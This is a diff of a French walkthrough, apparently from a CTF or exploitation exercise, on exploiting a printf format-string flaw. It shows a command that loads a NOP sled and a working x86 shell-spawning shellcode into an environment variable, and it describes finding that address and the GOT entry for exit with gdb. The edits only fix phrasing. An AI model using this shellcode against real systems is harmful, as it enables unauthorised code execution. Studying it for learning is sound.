@@ -7,13 +7,13 @@ La string est alors affiché par un **printf** avant que le programme appele un 
 
 **Printf** ne prennant pas d'argument, on va pouvoir exploiter sont fonctionnement avec un **SHELLCODE**.
 
-On commence par ajouter notre **SHELLCODE** aux variables d'environnements :
+On commence par ajouter notre **SHELLCODE** aux variables d'environnements afin de récuperer son adresse plus tard :
 
 ```bash
 > export SHELLCODE=`python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"'`
 ```
 
-Avec gdb, nous allons cherché l'addresse de notre **SHELLCODE**, on va ensuite récupérer une adresse qui pointe au milieu de notre **nop slide**.
+Avec gdb, nous allons cherché l'adresse de notre **SHELLCODE**, on va ensuite récupérer une adresse qui pointe au milieu de notre **nop slide**.
 On en profite pour récupérer l'adresse dans la **GOT** qui jump vers la fonction **exit** :
 
 ```gdb
